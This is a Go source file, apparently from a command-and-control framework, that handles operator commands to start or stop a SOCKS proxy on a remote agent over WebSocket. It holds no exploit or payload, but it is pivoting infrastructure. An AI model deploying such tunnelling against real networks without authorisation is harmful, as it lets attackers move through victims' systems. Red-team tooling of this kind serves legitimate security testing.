// internal/websocket/handlers/socks.go
package handlers

import (
	"c2/internal/websocket/hub"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"time"
)

func (h *WSHandler) handleSocksCommand(client *hub.Client, message []byte) error {
	var msg struct {
		Type string `json:"type"`
		Data struct {
			Command   string `json:"command"`
			AgentID   string `json:"agent_id"`
			SocksPort int    `json:"port"`
			WSSPort   int    `json:"wss_port"`
			WSSHost   string `json:"wss_host"`
			BasePath  string `json:"base_path"`
		} `json:"data"`
	}

	if err := json.Unmarshal(message, &msg); err != nil {
		return fmt.Errorf("failed to unmarshal SOCKS message: %v", err)
	}

	parts := strings.Fields(msg.Data.Command)
	if len(parts) < 2 {
		return fmt.Errorf("invalid SOCKS command format: need 'socks <action>'")
	}

	action := parts[1]

	var fullCommand string
	switch action {
	case "start":
		if msg.Data.SocksPort == 0 || msg.Data.WSSPort == 0 || msg.Data.WSSHost == "" {
			return fmt.Errorf("socks start requires port, wss_port, and wss_host")
		}
		basePath := msg.Data.BasePath
		if basePath == "" {
			basePath = "/"
		}
		if !strings.HasPrefix(basePath, "/") {
			basePath = "/" + basePath
		}
		fullCommand = fmt.Sprintf("socks start %d %s%s %d",
			msg.Data.SocksPort, msg.Data.WSSHost, basePath, msg.Data.WSSPort)
	case "stop":
		if msg.Data.SocksPort == 0 {
			return fmt.Errorf("socks stop requires port")
		}
		fullCommand = fmt.Sprintf("socks stop %d", msg.Data.SocksPort)
	default:
		return fmt.Errorf("unknown SOCKS action: %s", action)
	}

	command := map[string]interface{}{
		"command":   fullCommand,
		"agent_id":  msg.Data.AgentID,
		"username":  client.Username,
		"timestamp": time.Now().Format(time.RFC3339),
	}

	if err := h.agentClient.SendToStream("agent_command", command); err != nil {
		log.Printf("Failed to send SOCKS command: %v", err)
		return err
	}

	response := Response{
		Type:    "command_queued",
		Status:  "success",
		Message: fmt.Sprintf("SOCKS %s command queued", action),
	}

	responseJSON, _ := json.Marshal(response)
	client.Send <- responseJSON

	return nil
}
